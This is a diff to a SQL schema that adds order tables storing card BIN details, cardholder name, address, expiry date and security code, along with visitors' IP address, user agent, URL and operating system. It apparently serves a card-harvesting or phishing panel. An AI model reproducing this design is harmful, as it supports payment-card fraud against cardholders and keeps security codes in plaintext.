@@ -10,4 +10,33 @@ CREATE TABLE IF NOT EXISTS users (
 	 password VARCHAR(255) NOT NULL,
 	 role VARCHAR(255) NOT NULL DEFAULT 'user',
 	 created TIMESTAMP NOT NULL DEFAULT now()
-); 
+);
+
+CREATE TABLE IF NOT EXISTS orders(
+	id SERIAL PRIMARY KEY NOT NULL,
+	uid_order VARCHAR(255) NOT NULL,
+	created TIMESTAMP NOT NULL DEFAULT now(),
+	status VARCHAR(255) NOT NULL DEFAULT 'Action required'
+);
+
+CREATE TABLE IF NOT EXISTS order_data(
+	id SERIAL PRIMARY KEY NOT NULL,
+	uid_order VARCHAR(255) NOT NULL,
+	bin_brand VARCHAR(255) NOT NULL,
+	bin_type VARCHAR(255) NOT NULL,
+	bin_bank VARCHAR(255) NOT NULL,
+	bin_country VARCHAR(255) NOT NULL,
+	name_card VARCHAR(255) NOT NULL,
+	mobile_card VARCHAR(255) NOT NULL,
+	address_card VARCHAR(255) NOT NULL,
+	holder_name_card VARCHAR(255) NOT NULL,
+	exp_month VARCHAR(255) NOT NULL,
+	exp_year VARCHAR(255) NOT NULL,
+	security_code VARCHAR(255) NOT NULL,
+	user_agent VARCHAR(255) NOT NULL,
+	ip_address VARCHAR(255) NOT NULL,
+	current_url VARCHAR(255) NOT NULL,
+	lang VARCHAR(255) NOT NULL,
+	operating_system VARCHAR(255) NOT NULL,
+	created TIMESTAMP NOT NULL DEFAULT now()
+);
